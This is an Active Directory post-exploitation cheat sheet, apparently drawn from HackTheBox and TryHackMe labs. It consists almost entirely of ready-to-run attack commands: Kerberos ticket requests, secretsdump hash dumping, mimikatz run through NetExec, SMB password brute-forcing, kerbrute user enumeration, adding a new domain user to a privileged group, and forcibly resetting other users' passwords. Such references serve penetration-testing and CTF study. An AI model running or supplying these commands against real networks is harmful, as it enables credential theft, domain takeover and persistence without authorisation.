# Post Exploitation

## Impacket

To get TGT (Ticket Granting Ticket with impacket):

```bash
getTGT.py domain.htb/user
```

To dump hashes:

```bash
secretsdump.py htb.local/aditya:aditya@<ip>
```

## Bloodhound

To use TGT with bloodhound

{% code overflow="wrap" %}
```bash
KRB5CCNAME=user.ccache ./bloodhound.py -k -dc dc.domain.htb -ns <ip> -c All -d domain.htb -u user@domain.htb
```
{% endcode %}

## NetExec



{% embed url="https://cheatsheet.haax.fr/windows-systems/exploitation/crackmapexec/" %}

#### mimikatz module:

{% code overflow="wrap" %}
```bash
nxc smb <ip> -u 'Administrator' -p 'PASS' --local-auth -M mimikatz
```
{% endcode %}

```bash
nxc smb <ip> -u 'Administrator' -p 'PASS' -M mimikatz
```

{% code overflow="wrap" %}
```bash
nxc smb <ip> -u Administrator -p 'PASS' -M mimikatz -o COMMAND='privilege::debug'
```
{% endcode %}

#### Password Bruteforce:

```bash
nsc smb <ip> -u userlist.out -p passlist.txt 
```

##

## Kerbrute

To check if users exist and then get their hashes:

{% code overflow="wrap" %}
```bash
kerbrute userenum --dc dc.domain.htb -d domain.htb username.txt
```
{% endcode %}

{% hint style="info" %}
If hashcat can't crack use --downgrade flag
{% endhint %}

## Enumeration

To check domain details

{% code title="can also enumerate individual accounts" %}
```powershell
net user /domain
```
{% endcode %}

To check group details

```
net group /domain
```

To add new user to domain:

```
net user aditya aditya123@ /add /domain
```

To add user to a group:

```
net group "Exchange Windows Permissions" /add aditya
```

To check users in the group:

```
net group "Tier 1 Admins" /domain
```

To check password policy, lockout policy, etc:

```
net accounts /domain
```

To reset other user's password if permission present use:

{% code overflow="wrap" %}
```powershell
Set-ADAccountPassword name -Reset -NewPassword (Read-Host -AsSecureString -Prompt 'New Password') -Verbose

New Password: *********
```
{% endcode %}

If username already present in format of : then:

```
runas.exe /netonly /user:<domain>\<username> cmd.exe
```

#### Powershell:

```powershell
Get-ADUser -Identity mr.robot -Server evilcorp.com -Properties *
```

{% code overflow="wrap" %}
```powershell
Get-ADUser -Filter 'Name -like "*stevens"' -Server za.tryhackme.com | Format-Table Name,SamAccountName -A
```
{% endcode %}

For groups:

```powershell
Get-ADGroup -Identity Administrators -Server za.tryhackme.com
```

```powershell
Get-ADGroupMember -Identity Administrators -Server za.tryhackme.com
```

For domains:

```powershell
Get-ADDomain -Server za.tryhackme.com
```

Change Password:

{% code overflow="wrap" %}
```powershell
Set-ADAccountPassword -Identity gordon.stevens -Server za.tryhackme.com -OldPassword (ConvertTo-SecureString -AsPlaintext "old" -force) -NewPassword (ConvertTo-SecureString -AsPlainText "new" -Force)
```
{% endcode %}
